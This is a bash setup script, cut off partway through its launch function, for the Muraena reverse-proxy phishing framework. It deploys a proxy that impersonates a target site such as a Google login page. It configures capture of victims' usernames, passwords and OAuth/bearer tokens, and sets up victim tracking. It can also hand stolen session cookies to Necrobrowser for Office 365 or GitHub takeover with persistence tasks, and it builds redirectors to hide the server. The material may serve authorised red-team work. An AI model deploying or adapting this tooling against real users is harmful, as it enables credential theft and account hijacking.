#!/usr/bin/env bash
set -euo pipefail

# ─────────────────────────────────────────────────────────────────────────────
# Muraena — plug-and-play setup script
#
# Interactive:       ./setup.sh
# Non-interactive:   ./setup.sh --ci   (reads from environment variables)
#
# CI environment variables:
#   MURAENA_PHISHING_DOMAIN     required  your phishing domain
#   MURAENA_TARGET_DOMAIN       required  domain to proxy
#   MURAENA_TLS_MODE            1=letsencrypt-http  2=letsencrypt-dns  3=self-signed  4=none
#   MURAENA_DNS_PROVIDER        cloudflare|route53|manual (required when TLS_MODE=2)
#   MURAENA_CF_API_TOKEN        Cloudflare API token (when DNS_PROVIDER=cloudflare)
#   MURAENA_TRACKING            true/false (default: true)
#   MURAENA_TOKEN_CAPTURE       true/false — OAuth/bearer token capture (default: false)
#   MURAENA_SESSION_MODE        1=store-only  2=necro-docker  3=necro-external
#   MURAENA_NECRO_ENDPOINT      required when SESSION_MODE=3
#   MURAENA_NECRO_COOKIES       comma-separated trigger cookie names
#   MURAENA_NECRO_TASK_TYPE     office365|github|generic (default: generic)
#   MURAENA_REDIRECTOR_IP       optional — comma-separated redirector IPs (e.g. "1.2.3.4,5.6.7.8")
#   MURAENA_REDIRECTOR_TYPE     comma-separated types matching each IP (default: nginx for each)
#   MURAENA_TELEGRAM_TOKEN      optional
#   MURAENA_TELEGRAM_CHAT_ID    optional
# ─────────────────────────────────────────────────────────────────────────────

CI_MODE=false
[[ "${1:-}" == "--ci" ]] && CI_MODE=true

# Global arrays — must be initialised before any function runs (set -u safety)
REDIRECTOR_IPS=()
REDIRECTOR_TYPES=()

BOLD="\033[1m"
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
CYAN="\033[36m"
RESET="\033[0m"

info()    { echo -e "${GREEN}[+]${RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
error()   { echo -e "${RED}[✗]${RESET} $*"; exit 1; }
section() { echo -e "\n${BOLD}${CYAN}── $* ──${RESET}"; }
ask()     { echo -ne "${BOLD}$1${RESET} "; }

# ── root check ────────────────────────────────────────────────────────────────

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (or with sudo).\n  sudo bash setup.sh"
    fi
}

# ── prerequisites ─────────────────────────────────────────────────────────────

check_deps() {
    local missing=()
    for cmd in docker git openssl curl; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    [[ ${#missing[@]} -gt 0 ]] && error "Missing required tools: ${missing[*]}\nInstall them and re-run."

    if ! docker compose version &>/dev/null; then
        error "Docker Compose v2 not found. Install Docker Desktop or the compose plugin."
    fi
    info "Prerequisites OK."
}

# ── detect public IP ──────────────────────────────────────────────────────────

get_public_ip() {
    curl -s4 --max-time 5 https://ifconfig.me 2>/dev/null \
    || curl -s4 --max-time 5 https://api.ipify.org 2>/dev/null \
    || curl -s4 --max-time 5 https://icanhazip.com 2>/dev/null \
    || echo "unknown"
}

# ── DNS check ────────────────────────────────────────────────────────────────

check_dns() {
    local domain="$1"
    local server_ip
    server_ip=$(get_public_ip)

    info "Server public IP: ${server_ip}"

    local resolved
    resolved=$(dig +short "$domain" A 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | tail -1 || true)
    # Fall back to `host` if dig is absent or returned no IP
    if [[ -z "$resolved" ]]; then
        resolved=$(host "$domain" 2>/dev/null | awk '/has address/{print $NF}' | head -1 || true)
    fi

    if [[ -z "$resolved" ]]; then
        warn "Cannot resolve ${domain} — DNS not set up yet?"
        warn "Let's Encrypt will FAIL until the domain points at this server."
        [[ "$CI_MODE" == true ]] && return
        ask "Continue anyway? [y/N]:"
        read -r ans; [[ "$ans" =~ ^[Yy]$ ]] || exit 0
    elif [[ "$resolved" != "$server_ip" && "$server_ip" != "unknown" ]]; then
        warn "${domain} resolves to ${resolved}, but this server is ${server_ip}."
        warn "If you are using a redirector this is expected. Otherwise update DNS."
        [[ "$CI_MODE" == true ]] && return
        ask "Continue anyway? [y/N]:"
        read -r ans; [[ "$ans" =~ ^[Yy]$ ]] || exit 0
    else
        info "${domain} → ${resolved} ✓"
    fi
}

# ── firewall ──────────────────────────────────────────────────────────────────

setup_firewall() {
    # Accepts zero or more redirector IPs as arguments
    local -a redir_ips=("$@")
    local has_redirectors=false
    [[ ${#redir_ips[@]} -gt 0 ]] && has_redirectors=true

    section "Firewall"

    if command -v ufw &>/dev/null; then
        info "Configuring ufw..."
        # Allow SSH first — must come before enable so we don't lock ourselves out
        ufw allow 22/tcp &>/dev/null || true
        ufw --force enable &>/dev/null || true

        if [[ "$has_redirectors" == true ]]; then
            ufw delete allow 80/tcp  &>/dev/null || true
            ufw delete allow 443/tcp &>/dev/null || true
            for ip in "${redir_ips[@]}"; do
                ufw allow from "$ip" to any port 80  proto tcp
                ufw allow from "$ip" to any port 443 proto tcp
                info "ufw: ports 80/443 allowed from redirector ${ip}"
            done
        else
            ufw allow 80/tcp
            ufw allow 443/tcp
            info "ufw: ports 80 and 443 opened."
        fi
        ufw reload &>/dev/null || true

    elif command -v firewall-cmd &>/dev/null; then
        info "Configuring firewalld..."
        systemctl start firewalld &>/dev/null || true
        if [[ "$has_redirectors" == true ]]; then
            for ip in "${redir_ips[@]}"; do
                firewall-cmd --permanent --add-rich-rule="rule family=ipv4 source address=${ip} port port=80  protocol=tcp accept"
                firewall-cmd --permanent --add-rich-rule="rule family=ipv4 source address=${ip} port port=443 protocol=tcp accept"
                info "firewalld: ports 80/443 allowed from redirector ${ip}"
            done
        else
            firewall-cmd --permanent --add-service=http
            firewall-cmd --permanent --add-service=https
            info "firewalld: http/https services opened."
        fi
        firewall-cmd --reload

    elif command -v iptables &>/dev/null; then
        info "Configuring iptables..."
        if [[ "$has_redirectors" == true ]]; then
            for ip in "${redir_ips[@]}"; do
                iptables -C INPUT -s "$ip" -p tcp --dport 80  -j ACCEPT 2>/dev/null \
                    || iptables -I INPUT -s "$ip" -p tcp --dport 80  -j ACCEPT
                iptables -C INPUT -s "$ip" -p tcp --dport 443 -j ACCEPT 2>/dev/null \
                    || iptables -I INPUT -s "$ip" -p tcp --dport 443 -j ACCEPT
                info "iptables: ports 80/443 allowed from redirector ${ip}"
            done
            # Drop 80/443 from all other sources
            iptables -C INPUT -p tcp --dport 80  -j DROP 2>/dev/null || iptables -A INPUT -p tcp --dport 80  -j DROP
            iptables -C INPUT -p tcp --dport 443 -j DROP 2>/dev/null || iptables -A INPUT -p tcp --dport 443 -j DROP
        else
            iptables -C INPUT -p tcp --dport 80  -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 80  -j ACCEPT
            iptables -C INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 443 -j ACCEPT
            info "iptables: ports 80 and 443 opened."
        fi
        command -v netfilter-persistent &>/dev/null && netfilter-persistent save &>/dev/null || true
        command -v iptables-save &>/dev/null        && iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
    else
        warn "No firewall tool found (ufw/firewalld/iptables). Configure manually."
    fi
}

# ── install certbot ───────────────────────────────────────────────────────────

install_certbot() {
    command -v certbot &>/dev/null && return
    info "Installing certbot..."
    if command -v apt-get &>/dev/null; then
        apt-get update -qq
        apt-get install -y -qq certbot python3-certbot-nginx
        # DNS plugins
        apt-get install -y -qq python3-certbot-dns-cloudflare python3-certbot-dns-route53 2>/dev/null || true
    elif command -v yum &>/dev/null; then
        yum install -y -q certbot python3-certbot-nginx
        yum install -y -q python3-certbot-dns-cloudflare 2>/dev/null || true
    elif command -v dnf &>/dev/null; then
        dnf install -y -q certbot python3-certbot-nginx
        dnf install -y -q python3-certbot-dns-cloudflare 2>/dev/null || true
    elif command -v apk &>/dev/null; then
        apk add --quiet certbot certbot-nginx
    elif command -v brew &>/dev/null; then
        brew install certbot &>/dev/null
    elif command -v snap &>/dev/null; then
        snap install --classic certbot && ln -sf /snap/bin/certbot /usr/bin/certbot
    else
        error "Cannot install certbot — no supported package manager found.\nInstall it manually: https://certbot.eff.org"
    fi
    info "certbot installed: $(certbot --version 2>&1)"
}

# ── TLS: Let's Encrypt HTTP-01 ────────────────────────────────────────────────

setup_tls_letsencrypt_http() {
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "Certificates already present — skipping."
        return
    fi
    install_certbot

    # certbot standalone needs port 80 free — stop Docker first
    info "Stopping Docker containers temporarily (certbot needs port 80)..."
    docker compose down 2>/dev/null || true

    info "Requesting certificate for ${PHISHING_DOMAIN} (HTTP-01)..."
    certbot certonly \
        --standalone \
        --non-interactive \
        --agree-tos \
        --register-unsafely-without-email \
        -d "$PHISHING_DOMAIN"

    _copy_letsencrypt_certs
    _setup_cert_renewal
}

# ── TLS: Let's Encrypt DNS-01 ─────────────────────────────────────────────────

setup_tls_letsencrypt_dns() {
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "Certificates already present — skipping."
        return
    fi
    install_certbot

    case "${DNS_PROVIDER:-manual}" in
        cloudflare)
            local cf_ini="/tmp/cloudflare-$$.ini"
            # Always remove the credentials file on exit, even if certbot fails
            trap "rm -f '${cf_ini}'" RETURN
            printf 'dns_cloudflare_api_token = %s\n' "${CF_API_TOKEN}" > "$cf_ini"
            chmod 600 "$cf_ini"
            info "Requesting certificate for ${PHISHING_DOMAIN} (DNS-01 via Cloudflare)..."
            certbot certonly \
                --dns-cloudflare \
                --dns-cloudflare-credentials "$cf_ini" \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                -d "$PHISHING_DOMAIN"
            ;;
        route53)
            info "Requesting certificate for ${PHISHING_DOMAIN} (DNS-01 via Route53)..."
            certbot certonly \
                --dns-route53 \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                -d "$PHISHING_DOMAIN"
            ;;
        manual|*)
            warn "Manual DNS-01 challenge — you will need to add a TXT record to your DNS."
            certbot certonly \
                --manual \
                --preferred-challenges dns \
                --agree-tos \
                --register-unsafely-without-email \
                -d "$PHISHING_DOMAIN"
            ;;
    esac

    _copy_letsencrypt_certs
    _setup_cert_renewal
}

_copy_letsencrypt_certs() {
    mkdir -p config
    local base="/etc/letsencrypt/live/${PHISHING_DOMAIN}"
    cp "${base}/cert.pem"      config/cert.pem
    cp "${base}/privkey.pem"   config/privkey.pem
    cp "${base}/fullchain.pem" config/fullchain.pem
    info "Certificates saved to config/"
}

_setup_cert_renewal() {
    local repo_dir
    repo_dir="$(pwd)"

    # Write the deploy hook as a standalone script so spaces in paths are safe
    local hook_script="/etc/letsencrypt/renewal-hooks/deploy/muraena-copy-certs.sh"
    mkdir -p /etc/letsencrypt/renewal-hooks/deploy
    cat > "$hook_script" <<HOOK
#!/usr/bin/env bash
# Muraena — certbot deploy hook: copy renewed certs and restart container
set -euo pipefail
DOMAIN="${PHISHING_DOMAIN}"
REPO="${repo_dir}"
cp "/etc/letsencrypt/live/\${DOMAIN}/cert.pem"      "\${REPO}/config/cert.pem"
cp "/etc/letsencrypt/live/\${DOMAIN}/privkey.pem"   "\${REPO}/config/privkey.pem"
cp "/etc/letsencrypt/live/\${DOMAIN}/fullchain.pem" "\${REPO}/config/fullchain.pem"
docker compose -f "\${REPO}/docker-compose.yml" restart muraena
HOOK
    chmod 755 "$hook_script"

    # Standard cron to trigger certbot renew twice daily
    local cron_file="/etc/cron.d/muraena-certbot-renew"
    cat > "$cron_file" <<CRON
# Muraena — Let's Encrypt auto-renewal (twice daily, as recommended by EFF)
0 3,15 * * * root certbot renew --quiet
CRON
    chmod 644 "$cron_file"

    info "Auto-renewal cron installed  → ${cron_file}"
    info "Cert deploy hook installed   → ${hook_script}"
    info "Certs will renew automatically; Muraena restarts on each renewal."
}

setup_tls_selfsigned() {
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "Certificates already present — skipping."
        return
    fi
    mkdir -p config
    info "Generating self-signed certificate for ${PHISHING_DOMAIN}..."

    # --addext (SAN) requires OpenSSL >= 1.1.1; fall back to a config file on older versions
    local ssl_ver
    ssl_ver=$(openssl version | awk '{print $2}')
    local major minor
    major=$(echo "$ssl_ver" | cut -d. -f1)
    minor=$(echo "$ssl_ver" | cut -d. -f2)

    if [[ "$major" -gt 1 ]] || [[ "$major" -eq 1 && "$minor" -ge 1 ]]; then
        openssl req -x509 -newkey rsa:4096 -sha256 -days 825 -nodes \
            -keyout config/privkey.pem \
            -out    config/cert.pem \
            -subj   "/CN=${PHISHING_DOMAIN}" \
            -addext "subjectAltName=DNS:${PHISHING_DOMAIN}" 2>/dev/null
    else
        # Legacy path: write a temporary openssl config with SAN extension
        local tmp_cfg
        tmp_cfg=$(mktemp)
        cat > "$tmp_cfg" <<SSLCFG
[req]
distinguished_name = req_distinguished_name
x509_extensions    = v3_req
prompt             = no
[req_distinguished_name]
CN = ${PHISHING_DOMAIN}
[v3_req]
subjectAltName = DNS:${PHISHING_DOMAIN}
SSLCFG
        openssl req -x509 -newkey rsa:4096 -sha256 -days 825 -nodes \
            -keyout config/privkey.pem \
            -out    config/cert.pem \
            -config "$tmp_cfg" 2>/dev/null
        rm -f "$tmp_cfg"
    fi

    cp config/cert.pem config/fullchain.pem
    warn "Self-signed cert generated — browsers will show a security warning."
}

# ── redirector setup ──────────────────────────────────────────────────────────

setup_redirector() {
    local redirector_ip="$1"
    local redirector_type="${2:-nginx}"
    local index="${3:-1}"        # label for multi-redirector configs
    local muraena_ip
    muraena_ip=$(get_public_ip)

    section "Redirector ${index} — ${redirector_ip} (${redirector_type})"
    info "Muraena IP (keep this SECRET): ${muraena_ip}"
    info "Redirector IP (goes in DNS):   ${redirector_ip}"

    local out_dir="config/redirector/redir-${index}"
    mkdir -p "$out_dir"

    case "$redirector_type" in
        nginx)
            cat > "${out_dir}/nginx.conf" <<NGINX
# ── Muraena Redirector — nginx stream (TCP pass-through) ──
# Deploy this on your redirector VPS (NOT the Muraena server).
# DNS A record for ${PHISHING_DOMAIN} → ${redirector_ip}
#
# Install:  apt-get install -y nginx
# Place at: /etc/nginx/nginx.conf  (or include from /etc/nginx/conf.d/)
# Enable:   systemctl restart nginx

stream {
    # Forward all HTTPS traffic transparently to Muraena
    server {
        listen     443;
        proxy_pass ${muraena_ip}:443;
        proxy_timeout 600s;
        proxy_connect_timeout 10s;
    }

    # Forward HTTP (used for HTTPS redirect + certbot HTTP-01 if needed)
    server {
        listen     80;
        proxy_pass ${muraena_ip}:80;
        proxy_timeout 60s;
    }
}
NGINX

            cat > "${out_dir}/setup-redirector.sh" <<'RSETUP'
#!/usr/bin/env bash
# Run this script ON YOUR REDIRECTOR VPS to install nginx as a TCP forwarder.
set -euo pipefail
apt-get update -qq && apt-get install -y -qq nginx
cp /dev/stdin /etc/nginx/nginx.conf << 'EOF'
NGINXCONF
EOF
nginx -t && systemctl restart nginx && systemctl enable nginx
echo "[+] Redirector nginx started."
RSETUP
            # Inject the actual nginx.conf into the setup script
            sed -i "s|NGINXCONF|$(sed 's/[&/\]/\\&/g' "${out_dir}/nginx.conf" | tr '\n' '~' | sed 's/~/\\n/g')|" \
                "${out_dir}/setup-redirector.sh" 2>/dev/null || true
            chmod +x "${out_dir}/setup-redirector.sh"
            ;;

        socat)
            cat > "${out_dir}/socat-redirector.sh" <<SOCAT
#!/usr/bin/env bash
# Run this ON YOUR REDIRECTOR VPS to forward traffic to Muraena.
# DNS A record for ${PHISHING_DOMAIN} → ${redirector_ip}
set -euo pipefail

MURAENA_IP="${muraena_ip}"

apt-get install -y -qq socat 2>/dev/null || yum install -y socat 2>/dev/null || true

# Run as background daemons
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:\${MURAENA_IP}:443 &
socat TCP4-LISTEN:80,fork,reuseaddr  TCP4:\${MURAENA_IP}:80  &

echo "[+] socat forwarders running (PID \$!)"
echo "    443 → \${MURAENA_IP}:443"
echo "     80 → \${MURAENA_IP}:80"
SOCAT
            chmod +x "${out_dir}/socat-redirector.sh"
            ;;
    esac

    info "Redirector ${index} config written to ${out_dir}/"
    info "  Copy and run on redirector VPS ${redirector_ip}:"
    case "$redirector_type" in
        nginx) info "  → ${out_dir}/nginx.conf  (place at /etc/nginx/nginx.conf)" ;;
        socat) info "  → ${out_dir}/socat-redirector.sh" ;;
    esac
    echo ""
    warn "OPSEC — redirector ${index}:"
    warn "  1. DNS A record for ${PHISHING_DOMAIN} → ${redirector_ip}  (NOT ${muraena_ip})"
    warn "  2. Muraena firewall allows 80/443 only from redirector IPs"
    warn "  3. Never expose Muraena's IP in emails, certificates, or logs"
    warn "  4. Use DNS-01 challenge for Let's Encrypt (avoids port 80 exposure)"
}

# ── gather config ─────────────────────────────────────────────────────────────

gather_config() {
    if [[ "$CI_MODE" == true ]]; then
        PHISHING_DOMAIN="${MURAENA_PHISHING_DOMAIN:?MURAENA_PHISHING_DOMAIN must be set}"
        TARGET_DOMAIN="${MURAENA_TARGET_DOMAIN:?MURAENA_TARGET_DOMAIN must be set}"
        TLS_CHOICE="${MURAENA_TLS_MODE:-4}"
        DNS_PROVIDER="${MURAENA_DNS_PROVIDER:-manual}"
        CF_API_TOKEN="${MURAENA_CF_API_TOKEN:-}"
        # Normalise true/false → Y/N so write_config comparisons work in CI mode
        local _t="${MURAENA_TRACKING:-true}"
        [[ "$_t" == "true"  || "$_t" =~ ^[Yy]$ ]] && TRACKING_CHOICE="Y" || TRACKING_CHOICE="N"
        local _tc="${MURAENA_TOKEN_CAPTURE:-false}"
        [[ "$_tc" == "true" || "$_tc" =~ ^[Yy]$ ]] && TOKEN_CAPTURE="Y"  || TOKEN_CAPTURE="N"
        SESSION_MODE="${MURAENA_SESSION_MODE:-1}"
        NECRO_COOKIES="${MURAENA_NECRO_COOKIES:-sessionToken}"
        NECRO_TASK_TYPE="${MURAENA_NECRO_TASK_TYPE:-generic}"
        # Parse comma-separated redirector IPs and types into arrays
        IFS=',' read -ra REDIRECTOR_IPS   <<< "${MURAENA_REDIRECTOR_IP:-}"
        IFS=',' read -ra REDIRECTOR_TYPES <<< "${MURAENA_REDIRECTOR_TYPE:-}"
        # Pad REDIRECTOR_TYPES with "nginx" if shorter than REDIRECTOR_IPS
        while [[ ${#REDIRECTOR_TYPES[@]} -lt ${#REDIRECTOR_IPS[@]} ]]; do
            REDIRECTOR_TYPES+=("nginx")
        done
        TG_TOKEN="${MURAENA_TELEGRAM_TOKEN:-}"
        TG_CHAT_ID="${MURAENA_TELEGRAM_CHAT_ID:-}"
        TG_CHOICE="N"
        [[ -n "$TG_TOKEN" && -n "$TG_CHAT_ID" ]] && TG_CHOICE="Y"
        NECRO_ENDPOINT=""
        [[ "$SESSION_MODE" == "2" ]] && NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
        [[ "$SESSION_MODE" == "3" ]] && NECRO_ENDPOINT="${MURAENA_NECRO_ENDPOINT:?MURAENA_NECRO_ENDPOINT must be set when SESSION_MODE=3}"
        info "CI mode — config loaded."
        info "  Domain   : ${PHISHING_DOMAIN} → ${TARGET_DOMAIN}"
        info "  TLS      : ${TLS_CHOICE}"
        info "  Sessions : ${SESSION_MODE}"
        for i in "${!REDIRECTOR_IPS[@]}"; do
            info "  Redirector $((i+1)): ${REDIRECTOR_IPS[$i]} (${REDIRECTOR_TYPES[$i]})"
        done
        return
    fi

    # ── interactive ───────────────────────────────────────────────────────────
    section "Core Configuration"
    ask "Phishing domain (e.g. evil.example.com):"
    read -r PHISHING_DOMAIN
    [[ -z "$PHISHING_DOMAIN" ]] && error "Phishing domain is required."

    ask "Target domain to proxy (e.g. accounts.google.com):"
    read -r TARGET_DOMAIN
    [[ -z "$TARGET_DOMAIN" ]] && error "Target domain is required."

    section "Opsec — Redirectors"
    echo "  Redirectors hide Muraena's real IP: DNS points to the redirector;"
    echo "  it TCP-forwards all traffic here. Add as many as you like."
    echo "  If one gets burned, swap it — Muraena stays untouched."
    echo ""
    REDIRECTOR_IPS=()
    REDIRECTOR_TYPES=()
    local redir_num=1
    while true; do
        ask "Add redirector VPS #${redir_num}? [y/N]:"
        read -r REDIR_CHOICE
        [[ ! "${REDIR_CHOICE:-N}" =~ ^[Yy]$ ]] && break
        local _rip=""
        ask "  Redirector #${redir_num} IP address:"
        read -r _rip
        [[ -z "$_rip" ]] && error "Redirector IP is required."
        echo "  1) nginx  (TCP stream proxy — recommended)"
        echo "  2) socat  (simple port forwarder)"
        ask "  Type [1/2]:"
        read -r _rt
        local _rtype="nginx"
        [[ "${_rt:-1}" == "2" ]] && _rtype="socat"
        REDIRECTOR_IPS+=("$_rip")
        REDIRECTOR_TYPES+=("$_rtype")
        info "  Added redirector #${redir_num}: ${_rip} (${_rtype})"
        redir_num=$((redir_num + 1))
    done

    section "TLS / HTTPS"
    if [[ ${#REDIRECTOR_IPS[@]} -gt 0 ]]; then
        echo "  Note: with a redirector, DNS-01 is recommended (no port 80 needed)."
        echo ""
    fi
    echo "  1) Let's Encrypt — HTTP-01  (needs port 80 open, no redirector)"
    echo "  2) Let's Encrypt — DNS-01   (needs DNS API or manual TXT record)"
    echo "  3) Self-signed              (testing / LAN)"
    echo "  4) None                     (plain HTTP, port 8080)"
    ask "Choose [1/2/3/4]:"
    read -r TLS_CHOICE
    TLS_CHOICE="${TLS_CHOICE:-4}"
    DNS_PROVIDER="manual"
    CF_API_TOKEN=""
    if [[ "$TLS_CHOICE" == "2" ]]; then
        echo "  DNS provider:"
        echo "  1) Cloudflare (automatic)"
        echo "  2) Route53    (automatic — needs AWS credentials in env)"
        echo "  3) Manual     (you add the TXT record yourself)"
        ask "Choose [1/2/3]:"
        read -r dp
        case "${dp:-3}" in
            1) DNS_PROVIDER="cloudflare"
               ask "Cloudflare API token:"
               read -rs CF_API_TOKEN; echo ;;
            2) DNS_PROVIDER="route53" ;;
            *) DNS_PROVIDER="manual"  ;;
        esac
    fi

    section "Tracking"
    ask "Enable victim tracking? [Y/n]:"
    read -r TRACKING_CHOICE
    TRACKING_CHOICE="${TRACKING_CHOICE:-Y}"

    ask "Enable OAuth/bearer token capture? [y/N]:"
    read -r TOKEN_CAPTURE
    TOKEN_CAPTURE="${TOKEN_CAPTURE:-N}"

    section "Session Handling"
    echo "  1) Store only     — save to Redis; inspect with redis-cli"
    echo "  2) Store + send   — Redis + Necrobrowser-NG in Docker (auto-cloned)"
    echo "  3) Store + send   — Redis + existing Necrobrowser-NG instance"
    echo ""
    ask "Choose [1/2/3] (default: 1):"
    read -r SESSION_MODE
    SESSION_MODE="${SESSION_MODE:-1}"
    NECRO_ENDPOINT=""
    NECRO_COOKIES="sessionToken"
    NECRO_TASK_TYPE="generic"
    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
        if [[ "$SESSION_MODE" == "3" ]]; then
            ask "Necrobrowser-NG endpoint URL:"
            read -r NECRO_ENDPOINT
            [[ -z "$NECRO_ENDPOINT" ]] && error "Endpoint is required."
        else
            NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
        fi
        ask "Trigger cookie name(s) (comma-separated):"
        read -r NECRO_COOKIES
        NECRO_COOKIES="${NECRO_COOKIES:-sessionToken}"
        ask "Task type (office365/github/generic):"
        read -r NECRO_TASK_TYPE
        NECRO_TASK_TYPE="${NECRO_TASK_TYPE:-generic}"
    fi

    section "Telegram Alerts"
    ask "Enable Telegram alerts? [y/N]:"
    read -r TG_CHOICE
    TG_CHOICE="${TG_CHOICE:-N}"
    TG_TOKEN=""
    TG_CHAT_ID=""
    if [[ "$TG_CHOICE" =~ ^[Yy]$ ]]; then
        ask "Bot token:"
        read -rs TG_TOKEN; echo
        ask "Chat ID (e.g. -1001234567890):"
        read -r TG_CHAT_ID
    fi
}

# ── write config.toml ─────────────────────────────────────────────────────────

write_config() {
    local tls_enable="false"
    local port="8080"
    local http_redirect="false"
    case "$TLS_CHOICE" in
        1|2|3) tls_enable="true"; port="443"; http_redirect="true" ;;
    esac

    local tracking_enable="false"
    [[ "$TRACKING_CHOICE" =~ ^[Yy]$ ]] && tracking_enable="true"

    local token_block=""
    if [[ "${TOKEN_CAPTURE:-N}" =~ ^[Yy]$ ]]; then
        token_block='
[tracking.tokens]
    enable        = true
    captureBearer = true
    keys  = ["access_token", "refresh_token", "id_token", "token", "bearer_token"]
    paths = [
        "/oauth/token", "/oauth2/token", "/token",
        "/api/token",   "/connect/token", "/auth/token",
        "/login/oauth/access_token",
    ]'
    fi

    local necro_block=""
    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
        IFS=',' read -ra COOKIE_ARR <<< "$NECRO_COOKIES"
        local cookie_toml=""
        for ck in "${COOKIE_ARR[@]}"; do
            ck="$(echo "$ck" | xargs)"
            cookie_toml+="\"${ck}\", "
        done
        cookie_toml="[${cookie_toml%, }]"
        necro_block="
[necrobrowser]
    enable   = true
    endpoint = \"${NECRO_ENDPOINT}\"
    profile  = \"./config/instrument.necro\"

    [necrobrowser.trigger]
        type   = \"cookies\"
        values = ${cookie_toml}
        delay  = 10"
    fi

    local tg_block=""
    if [[ "$TG_CHOICE" =~ ^[Yy]$ ]]; then
        tg_block="
[telegram]
    enable   = true
    botToken = \"${TG_TOKEN}\"
    chatIDs  = [\"${TG_CHAT_ID}\"]"
    fi

    mkdir -p config
    cat > config/config.toml <<TOML
# Generated by setup.sh — $(date -u +"%Y-%m-%d %H:%M UTC")

[proxy]
    phishing    = "${PHISHING_DOMAIN}"
    destination = "${TARGET_DOMAIN}"
    port        = ${port}

    [proxy.HTTPtoHTTPS]
        enable   = ${http_redirect}
        HTTPport = 80

[transform]
    [transform.base64]
        enable  = false
        padding = ["=", "."]
    [transform.response]
        skipContentType = ["font/*", "image/*"]

[log]
    enable = true

[redis]
    host = "redis"
    port = 6379

[tls]
    enable      = ${tls_enable}
    expand      = false
    certificate = "./config/cert.pem"
    key         = "./config/privkey.pem"
    root        = "./config/fullchain.pem"
    minVersion  = "TLS1.2"
    renegotiationSupport = "Never"

[tracking]
    enable             = ${tracking_enable}
    trackRequestCookie = true

    [tracking.trace]
        identifier = "_uid"
        validator  = "[a-zA-Z0-9]{8}"
        header     = "X-Track"
        [tracking.trace.landing]
            type   = "query"
            header = "X-Landing"

[tracking.secrets]
    paths = ["/login", "/signin", "/auth", "/session"]
    [[tracking.secrets.patterns]]
        label = "Username"
        start = "username="
        end   = "&"
    [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end   = "&"
${token_block}
${necro_block}
${tg_block}
TOML
    info "config/config.toml written."
}

# ── write instrument.necro ────────────────────────────────────────────────────

write_necro_profile() {
    local task_type="${NECRO_TASK_TYPE:-generic}"
    cat > config/instrument.necro <<JSON
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "${task_type}",
    "name": ["ScreenshotPages"],
    "params": {
      "fixSession": "https://${TARGET_DOMAIN}",
      "credentials": %%%CREDENTIALS%%%,
      "tokens": %%%TOKENS%%%
    }
  },
  "cookies": %%%COOKIES%%%
}
JSON
    info "config/instrument.necro written."
}

# ── docker-compose override for necrobrowser ──────────────────────────────────

write_compose_override() {
    [[ "${SESSION_MODE:-1}" != "2" ]] && return
    info "Cloning Necrobrowser-NG..."
    if [[ ! -d necrobrowser-ng ]]; then
        git clone --depth 1 --quiet https://github.com/muraenateam/necrobrowser.git necrobrowser-ng
    else
        info "necrobrowser-ng/ already present, skipping clone."
    fi

    # Patch necrobrowser's own config.toml so it connects to the Docker Redis
    # service ("redis") rather than localhost / 127.0.0.1
    local necro_cfg="necrobrowser-ng/config.toml"
    if [[ -f "$necro_cfg" ]]; then
        sed -i 's|host\s*=\s*"localhost"|host = "redis"|g'   "$necro_cfg" 2>/dev/null || true
        sed -i 's|host\s*=\s*"127\.0\.0\.1"|host = "redis"|g' "$necro_cfg" 2>/dev/null || true
        info "Patched necrobrowser-ng/config.toml Redis host → redis"
    fi

    # Inject persistence tasks into necrobrowser-ng so they are available at runtime
    local script_dir
    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    local task_src="${script_dir}/necro-tasks/persistence/necrotask.js"
    if [[ -f "$task_src" ]]; then
        mkdir -p necrobrowser-ng/tasks/persistence
        cp "$task_src" necrobrowser-ng/tasks/persistence/necrotask.js
        info "Installed persistence tasks → necrobrowser-ng/tasks/persistence/necrotask.js"
    else
        warn "necro-tasks/persistence/necrotask.js not found — persistence tasks not installed."
    fi

    # The override removes the `profiles:` restriction so plain `docker compose up -d`
    # starts necrobrowser.  It also adds the settings Chrome needs in Docker:
    #   shm_size  — Chrome defaults /dev/shm to 64 MB which causes it to crash;
    #               2 GB is the recommended minimum for Puppeteer in containers.
    #   security_opt / cap_add — Chrome's sandboxing requires Linux capabilities
    #               that are dropped by Docker's default seccomp profile.
    cat > docker-compose.override.yml <<'YML'
# Auto-generated by setup.sh — do not edit manually; re-run setup.sh to regenerate
services:
  necrobrowser:
    profiles: []          # clear the base profile so plain `up -d` starts this service
    build: ./necrobrowser-ng
    restart: unless-stopped
    ports:
      - "3000:3000"
    depends_on:
      redis:
        condition: service_healthy
    environment:
      - REDIS_HOST=redis
      - REDIS_PORT=6379
    # Chrome / Puppeteer requirements in Docker:
    shm_size: '2gb'       # default 64 MB causes Chrome to OOM-crash
    security_opt:
      - seccomp=unconfined  # Chrome sandbox needs syscalls blocked by default Docker seccomp
    cap_add:
      - SYS_ADMIN           # required for Chrome's namespace sandbox
YML
    info "docker-compose.override.yml written."
}

# ── launch ────────────────────────────────────────────────────────────────────

launch() {
    section "Starting Muraena"

    # Build — include necrobrowser profile when SESSION_MODE=2 so it is compiled
    local compose_flags=()
    [[ "${SESSION_MODE:-1}" == "2" ]] && compose_flags+=(--profile necrobrowser)

    info "Building images..."
    if ! docker compose "${compose_flags[@]}" build 2>&1; then
        error "docker compose build failed — check output above."
    fi

    info "Starting containers..."
    docker compose "${compose_flags[@]}" up -d
